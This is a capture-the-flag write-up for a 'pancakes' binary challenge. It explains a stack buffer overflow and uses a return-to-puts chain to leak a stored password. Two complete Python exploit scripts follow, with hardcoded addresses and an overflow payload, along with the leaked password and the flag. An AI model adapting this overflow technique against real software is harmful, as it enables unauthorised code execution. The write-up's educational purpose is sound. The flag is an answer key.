> You ever just get a craving for pancakes?

Solved by Vanilla

This binary has a “printFlag” function, which first prompts the user to enter a password from a different file before allowing access to the flag.  It has a stack-based buffer overflow too, like so many of the other challenges (c’mon, guys, there’s more to pwn than just SBBO!)  NX is on, PIE is off.  When it reads the “known-good” password, it stores that to a static buffer.  So the easiest way to win at this one is to ret2libc (we don’t have the libc address, but all we need is puts, which is in the PLT, so we only need the executable address which is static, not libc’s address) to puts, passing it the known buffer address as an argument.  That prints the password.  Then you just give it the password and it’ll give you the flag.

To get the password:

#!/usr/bin/env python3
import struct
import vanillib

PUTS_ADDR = 0x8049060
PASSWORD_ADDR = 0x804C060

def exploit(iface):
    iface.expect(b"Enter pancake password\n> ")
    iface.write(b"x" * 0x2C + struct.pack('<III', PUTS_ADDR, 0, PASSWORD_ADDR))
    iface.expect(b"Try harder\n")
    print(iface.read_some())

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Resulting password is l0r3m_1p5um_d0l0r_517_4m37

To get the flag:
#!/usr/bin/env python3
import struct
import vanillib

PUTS_ADDR = 0x8049060
PASSWORD_ADDR = 0x804C060

def exploit(iface):
    iface.expect(b"Enter pancake password\n> ")
    iface.write(open("password.txt", "rb").read().ljust(0x40, b"\0"))
    print(iface.read_some())

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Flag: TUCTF{p4nc4k35_4r3_4b50lu73ly_d3l1c10u5_4nd_y0u_5h0uld_637_50m3_4f73r_7h15}

